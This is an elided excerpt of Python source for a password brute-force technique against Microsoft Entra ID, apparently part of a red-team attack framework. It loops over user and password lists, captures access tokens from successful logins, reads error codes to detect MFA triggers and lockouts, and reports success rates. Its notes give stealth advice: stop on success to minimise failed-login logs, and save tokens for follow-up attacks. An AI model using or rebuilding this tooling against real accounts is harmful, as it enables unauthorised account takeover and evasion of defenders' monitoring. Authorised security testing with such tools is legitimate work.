...
class EntraBruteforcePassword(BaseTechnique):
    def __init__(self):
        ...
        technique_notes = [
            TechniqueNote(
                "Monitor for MFA prompts and conditional access policy triggers which may indicate valid credentials even when authentication fails."
            ),
            TechniqueNote(
                "Save successful tokens automatically to enable immediate follow-up attacks without re-authentication."
            ),
            TechniqueNote(
                "Use the 'stop_on_success' option for stealth operations where you want to minimize failed authentication logs."
            ),
            TechniqueNote(
                "Large password lists can take significant time - consider using smaller, targeted lists during time-constrained engagements."
            ),
            TechniqueNote(
                "Account lockout detection helps prevent service disruption and maintains operational security during testing."
            ),
        ]
    ...
    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        ...
        try:
            ...
            try:
                ...
                password_list = [
                    p.strip() for p in password_text.split("\n") if p.strip()
                ]
            ...
            for username in user_list:
                ...
                for password in password_list:
                    ...
                    try:
                        ...
                        attack_results[username]["last_attempt"] = (
                        ...
                        if 200 <= response.status_code < 300:
                            ...
                            attack_results[username]["access_token"] = bool(
                                access_token
                            )
                                    ...
                                    "value": {
                                        ...
                                        "attack_summary": {
                                            ...
                                            "users_tested": len(
                                                [
                                                    u
                                                    for u in attack_results.keys()
                                                    if attack_results[u]["attempts"] > 0
                                                ]
                                            ),
                                            "success_rate": len(successful_auths)
                                            / len(user_list)
                                            * 100,
                                        },
                            ...
                            if any(
                                code in [50076, 50072, 50074, 50005, 50131]
                            ...
                            # Check for account lockout indicators
                                ...
                                any(code in [50053, 50057] for code in error_codes)
                                or "locked" in error_description.lower()
                            ):
                            ...
                            # Check for excessive consecutive failures (potential lockout risk)
                                ...
                                attack_results[username]["status"] = (
                                    "lockout_risk_detected"
                                )
                                break

                    except requests.exceptions.RequestException as e:
                        attack_results[username]["error_codes"].append(
            ...
            success_rate = (
                (users_with_success / len(user_list)) * 100 if user_list else 0
            )
